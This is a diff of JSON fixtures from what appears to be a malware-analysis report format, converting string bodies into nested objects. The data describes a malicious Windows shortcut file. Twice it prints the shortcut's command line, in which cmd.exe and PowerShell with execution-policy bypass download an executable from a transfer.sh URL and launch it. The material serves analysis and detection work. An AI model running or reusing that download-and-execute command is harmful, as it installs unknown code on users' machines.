@@ -5,7 +5,28 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [4.140885798315739, 3.9408997663408236, 3.4060413566562904, 3.3508292753270807, 5.201818151556713, 0.07954595518341845, 0.8536689233467398, 0.0, 3.0046063175283977, 3.930788110529508, 2.314044792483944]}}",
+        "body": {
+          "data": {
+            "domain": [
+              0,
+              8
+            ],
+            "values": [
+              4.140885798315739,
+              3.9408997663408236,
+              3.4060413566562904,
+              3.3508292753270807,
+              5.201818151556713,
+              0.07954595518341845,
+              0.8536689233467398,
+              0.0,
+              3.0046063175283977,
+              3.930788110529508,
+              2.314044792483944
+            ]
+          },
+          "type": "colormap"
+        },
         "body_config": {},
         "body_format": "GRAPH_DATA",
         "classification": "TLP:C",
@@ -18,7 +39,41 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"flags\": \"IDList, LinkInfo, RelativePath, CommandArgs, IconFile, Unicode, ExpString\", \"file_attributes\": \"Archive\", \"create_date\": \"2021:02:23 13:01:44+00:00\", \"access_date\": \"2022:03:28 23:43:54+00:00\", \"modify_date\": \"2021:02:23 13:01:44+00:00\", \"target_file_size\": 236544, \"icon_index\": 133, \"run_window\": \"Show Minimized No Activate\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"cmd.exe\", \"drive_type\": \"Fixed Disk\", \"local_base_path\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"relative_path\": \"..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\cmd.exe\", \"command_line_arguments\": \"/c  timeout /t 1 /nobreak && powershell -exec bypass \\\"Invoke-WebRequest -OutFile videoplayer.exe -Uri https://transfer.sh/YfSNTb/video000.exe\\\" && timeout /t 1 /nobreak & start /b videoplayer.exe\", \"icon_file_name\": \"%windir%\\\\system32\\\\imageres.dll\", \"machine_id\": \"desktop-vsfqmp4\", \"fill_attributes\": \"0x07\", \"popup_fill_attributes\": \"0xf5\", \"screen_buffer_size\": \"120 x 9001\", \"window_size\": \"120 x 30\", \"window_origin\": \"0 x 0\", \"font_size\": \"0 x 16\", \"font_family\": \"Unknown (0x36)\", \"font_weight\": 400, \"font_name\": \"Consolas\", \"cursor_size\": 25, \"full_screen\": \"No\", \"quick_edit\": \"Yes\", \"insert_mode\": \"Yes\", \"window_origin_auto\": \"Yes\", \"history_buffer_size\": 50, \"num_history_buffers\": 4, \"remove_history_duplicates\": \"No\"}",
+        "body": {
+          "access_date": "2022:03:28 23:43:54+00:00",
+          "command_line_arguments": "/c  timeout /t 1 /nobreak && powershell -exec bypass \"Invoke-WebRequest -OutFile videoplayer.exe -Uri https://transfer.sh/YfSNTb/video000.exe\" && timeout /t 1 /nobreak & start /b videoplayer.exe",
+          "create_date": "2021:02:23 13:01:44+00:00",
+          "cursor_size": 25,
+          "drive_type": "Fixed Disk",
+          "file_attributes": "Archive",
+          "fill_attributes": "0x07",
+          "flags": "IDList, LinkInfo, RelativePath, CommandArgs, IconFile, Unicode, ExpString",
+          "font_family": "Unknown (0x36)",
+          "font_name": "Consolas",
+          "font_size": "0 x 16",
+          "font_weight": 400,
+          "full_screen": "No",
+          "history_buffer_size": 50,
+          "hot_key": "(none)",
+          "icon_file_name": "%windir%\\system32\\imageres.dll",
+          "icon_index": 133,
+          "insert_mode": "Yes",
+          "local_base_path": "C:\\Windows\\System32\\cmd.exe",
+          "machine_id": "desktop-vsfqmp4",
+          "modify_date": "2021:02:23 13:01:44+00:00",
+          "num_history_buffers": 4,
+          "popup_fill_attributes": "0xf5",
+          "quick_edit": "Yes",
+          "relative_path": "..\\..\\..\\..\\..\\Windows\\System32\\cmd.exe",
+          "remove_history_duplicates": "No",
+          "run_window": "Show Minimized No Activate",
+          "screen_buffer_size": "120 x 9001",
+          "target_file_dosname": "cmd.exe",
+          "target_file_size": 236544,
+          "window_origin": "0 x 0",
+          "window_origin_auto": "Yes",
+          "window_size": "120 x 30"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -77,7 +132,9 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"machine_identifier\": \"desktop-vsfqmp4\"}",
+        "body": {
+          "machine_identifier": "desktop-vsfqmp4"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -97,7 +154,12 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"command_line_arguments\": \"/c  timeout /t 1 /nobreak && powershell -exec bypass \\\"Invoke-WebRequest -OutFile videoplayer.exe -Uri https://transfer.sh/YfSNTb/video000.exe\\\" && timeout /t 1 /nobreak & start /b videoplayer.exe\", \"local_base_path\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"relative_path\": \"..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\cmd.exe\", \"target_file_dosname\": \"Windows\\\\System32\\\\cmd.exe\"}",
+        "body": {
+          "command_line_arguments": "/c  timeout /t 1 /nobreak && powershell -exec bypass \"Invoke-WebRequest -OutFile videoplayer.exe -Uri https://transfer.sh/YfSNTb/video000.exe\" && timeout /t 1 /nobreak & start /b videoplayer.exe",
+          "local_base_path": "C:\\Windows\\System32\\cmd.exe",
+          "relative_path": "..\\..\\..\\..\\..\\Windows\\System32\\cmd.exe",
+          "target_file_dosname": "Windows\\System32\\cmd.exe"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
